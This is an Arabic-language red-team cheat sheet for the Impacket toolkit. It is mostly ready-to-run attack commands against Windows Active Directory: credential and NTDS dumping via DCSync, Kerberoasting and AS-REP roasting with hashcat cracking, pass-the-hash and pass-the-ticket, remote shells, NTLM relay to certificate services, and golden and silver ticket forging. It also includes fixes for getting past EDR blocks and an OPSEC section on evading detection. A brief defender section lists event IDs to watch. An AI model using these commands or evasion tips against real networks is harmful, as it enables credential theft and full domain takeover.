# Impacket — الدليل الشامل لهجمات بروتوكولات ويندوز

تُعد `Impacket` مجموعة برمجية من فئات لغة بايثون (Python classes) التي توفر تنفيذاً منخفض المستوى لمعظم بروتوكولات شبكات ويندوز: SMB، MSRPC، DCERPC، Kerberos، LDAP، NetBIOS، MS-RRP، MS-DRSR، وغيرها. تعتمد معظم أدوات الفريق الأحمر (Red-team) الخاصة ببيئات ويندوز (مثل `nxc` و `bloodhound-python` و `coercer`) على Impacket كركيزة أساسية. وتعتبر السكريبتات المضمنة فيها هي حقيبة الأدوات القياسية لمهاجمة الدليل النشط (Active Directory).

## التثبيت (Install)

```terminal
pipx install impacket
# أو عبر المصدر
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## السكريبتات الأكثر استخداماً

| السكريبت | الغرض |
|--------|---------|
| `psexec.py` | واجهة أوامر عن بُعد بأسلوب PsExec عبر SMB وإنشاء خدمة (Service) |
| `smbexec.py` | بديل لـ PsExec — ينفذ الأوامر عبر الخدمات دون رفع ملف تنفيذي |
| `wmiexec.py` | تنفيذ عن بُعد عبر DCOM/WMI (لا يتطلب إنشاء خدمة) |
| `atexec.py` | تنفيذ عن بُعد عبر المهام المجدولة (Scheduled Tasks) |
| `secretsdump.py` | استخراج قواعد بيانات SAM و LSA و NTDS.dit (عبر DCSync) |
| `GetUserSPNs.py` | هجوم Kerberoasting |
| `GetNPUsers.py` | هجوم AS-REP roasting |
| `GetADUsers.py` | حصر مستخدمي الدومين عبر LDAP |
| `lookupsid.py` | حل معرفات SID إلى أسماء مستخدمين |
| `addcomputer.py` | إضافة جهاز كمبيوتر (استغلال حصة MachineAccountQuota) |
| `rpcdump.py` | حصر واجهات RPC المتاحة |
| `samrdump.py` | حصر محتويات قاعدة بيانات SAM |
| `ntlmrelayx.py` | خادم ترحيل NTLM (NTLM relay server) |
| `ticketer.py` | تزوير تذاكر Kerberos الذهبية والفضية |
| `ticketConverter.py` | تحويل التذاكر بين تنسيقي kirbi ↔ ccache |
| `getTGT.py` / `getST.py` | طلب تذكرة TGT أو تذكرة خدمة (Service Ticket) |
| `Responder` | أداة مكملة لـ ntlmrelayx (ليست جزءاً من Impacket ذاتها) |
| `mssqlclient.py` | المصادقة والاستعلام من قواعد بيانات MSSQL |
| `dcomexec.py` | تنفيذ الأوامر بناءً على DCOM |

## صيغة بيانات الاعتماد الموحدة

```
[domain/]username[:password]@target.com[/path]
```

هجوم تمرير الهاش (Pass-the-hash):

```terminal
secretsdump.py -hashes :5e5a04...   corp.local/alice@dc01
```

هجوم تمرير التذكرة (Pass-the-ticket باستخدام ملف ccache):

```terminal
export KRB5CCNAME=alice.ccache
psexec.py -k -no-pass corp.local/alice@dc01.corp.local
```

## سير العمل (Workflows)

### secretsdump.py — استخراج كل ما يمكن استخراجه

```terminal
# استخراج SAM + LSA + بيانات الاعتماد المخزنة محلياً (يتطلب صلاحيات مسؤول محلي / SYSTEM)
secretsdump.py -hashes :5e5a... administrator@10.0.0.5

# هجوم DCSync — استخراج الدومين بالكامل (يتطلب صلاحيات DRSUAPI / مسؤول دومين)
secretsdump.py corp.local/admin@dc01.corp.local
secretsdump.py -just-dc corp.local/admin@dc01.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/admin@dc01.corp.local

# الاستخراج من ملف NTDS مخزن دون اتصال:
secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL
```

### GetUserSPNs.py — هجوم Kerberoast

```terminal
GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/alice:'Pass1' -outputfile spns.txt
hashcat -m 13100 spns.txt rockyou.txt
```

### GetNPUsers.py — هجوم AS-REP roast (بدون مصادقة!)

```terminal
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

### psexec.py / wmiexec.py / atexec.py — واجهة أوامر عن بُعد

```terminal
psexec.py corp.local/alice:'Pass1'@10.0.0.5
wmiexec.py corp.local/alice:'Pass1'@10.0.0.5
atexec.py corp.local/alice:'Pass1'@10.0.0.5 'whoami /all'
```

تعتبر `wmiexec` **أكثر تخفياً** من `psexec` (لأنها لا تنشئ خدمات). أما `atexec` فهي أهدأ (تعتمد على المهام المجدولة) ولكنها أبطأ قليلاً.

### ntlmrelayx.py — مستمع الترحيل (Relay listener)

```terminal
ntlmrelayx.py -t smb://10.0.0.5 -smb2support
ntlmrelayx.py -t ldap://dc01 --escalate-user alice
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
```

يتم استخدامه عادةً مع أدوات مثل PetitPotam لإجبار الضحية على المصادقة تجاه خادم الترحيل الخاص بك.

### ticketer.py — تزوير التذاكر

```terminal
# تذكرة ذهبية (Golden ticket) باستخدام هاش krbtgt
ticketer.py -nthash <krbtgt-NT> -domain-sid S-1-5-21-... -domain corp.local Administrator

# تذكرة فضية (Silver ticket) لخدمة محددة
ticketer.py -nthash <svc-NT> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/fileserver alice
```

### addcomputer.py — استغلال MachineAccountQuota

```terminal
addcomputer.py -computer-name 'PWN$' -computer-pass 'Pwn1234!' \
  -dc-ip 10.0.0.1 corp.local/alice:'Pass1'
```

افتراضياً، يمكن لأي مستخدم دومين إضافة حتى 10 أجهزة كمبيوتر — ويمكن استغلال ذلك في هجمات التفويض المقيد المبني على الموارد (Resource-based constrained delegation).

## النتائج المتوقعة (Good output)

ينتهي عمل `secretsdump.py` عادةً بظهور النتائج التالية:

```
[*] Cleaning up...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e5a04...
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abc123...
corp.local\svc_sql:1234:aad3b435b51404eeaad3b435b51404ee:f00ba1...
```

يمكن نسخ هذه الهاشات واستخدامها في hashcat أو مباشرة في هجمات تمرير الهاش (PtH).

## الأخطاء الشائعة والإصلاح (Bad output and fixes)

| العرض (Symptom) | السبب المحتمل | الإصلاح (Fix) |
|---------|-------|-----|
| `STATUS_ACCESS_DENIED` عند تنفيذ DCSync | نقص في الصلاحيات لبروتوكول DRSUAPI | يحتاج المستخدم لصلاحية `Replicate Directory Changes` |
| `KDC_ERR_PREAUTH_FAILED` | كلمة مرور خاطئة أو انحراف في الوقت (Clock skew) | استخدم `ntpdate` لمزامنة الوقت مع DC؛ وتحقق من كلمة المرور |
| `NetrShareEnum failed` | تطلب توقيع SMB (SMB signing) أو منع الدخول المجهول | استخدم بيانات اعتماد صحيحة؛ حيث يتم حظر النص الصريح عبر SMB |
| `psexec.py` عالق في الانتظار | نظام EDR قام بحظر الخدمة | جرب `wmiexec` أو `atexec`؛ أو قم بتوقيع ملفك التنفيذي الخاص |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | اسم المضيف أو SPN خاطئ | استخدم اسم النطاق الكامل (FQDN) وتأكد من حل Kerberos له |
| فشل عشوائي في الربط (Failed to bind) | منفذ DCERPC محظور | غير الوسيط: استخدم `-target-ip` أو جرب DC آخر |

## منظور المدافع (Defender's perspective)

تترك أدوات Impacket بصمات واضحة في سجلات الأحداث:
- **4624 type 3**: تسجيل دخول عبر الشبكة.
- **7045**: تثبيت خدمة جديدة (خاص بـ `psexec` — غالباً اسم خدمة عشوائي من 8 أحرف).
- **4697 / 4698**: إنشاء مهمة مجدولة (خاص بـ `atexec`).
- **5145**: الوصول إلى مشاركات الشبكة — كتابة ملفات مؤقتة في TEMP.
- **DCSync**: يطلق الحدث 4662 مع GUID خاص بـ `DS-Replication-Get-Changes-All`.

أفكار للكشف:
- تفعيل تنبيهات DCSync المدمجة في Microsoft Defender for Identity.
- استخدام قواعد Sigma لمراقبة أنماط أسماء خدمات psexec/wmiexec.
- مراقبة المصادقة من أجهزة المستوى 1/2 إلى المتحكم بالنطاق (DC) خارج المسارات المتوقعة.

## الأمن العملياتي (OPSEC)

- جميع السكريبتات مكتوبة بلغة بايثون؛ وبصماتها على الشبكة معروفة جداً لأنظمة الحماية الحديثة (EDR).
- استخدم Kerberos (`-k`) بدلاً من NTLM كلما أمكن — لتبدو حركة المرور أكثر طبيعية.
- احمل تذاكر Kerberos ccache الخاصة بك؛ ولا تعتمد على ذاكرة التخزين المؤقت لويندوز.
- عند تنفيذ DCSync، قم بذلك من جهاز لديه سبب منطقي للتواصل مع DC عبر LDAP/RPC.
- قم بتعديل السكريبتات لتغيير أسماء الخدمات الافتراضية لزيادة صعوبة الكشف.

## أدوات ذات صلة

| الأداة | الفرق |
|------|-----------|
| **NetExec (nxc)** | غلاف عالي المستوى يعتمد على Impacket لتسهيل العمليات الكبيرة |
| **Rubeus** | حقيبة أدوات Kerberos مكتوبة بلغة C# (تعمل من جهة ويندوز) |
| **Mimikatz** | مخصصة لاستخراج بيانات الاعتماد من ذاكرة LSASS محلياً |
| **Certipy** | متخصصة في مهاجمة خدمات شهادات الدليل النشط (AD CS) |
| **bloodhound-python** | تستخدم Impacket داخلياً لجمع البيانات من الدومين |
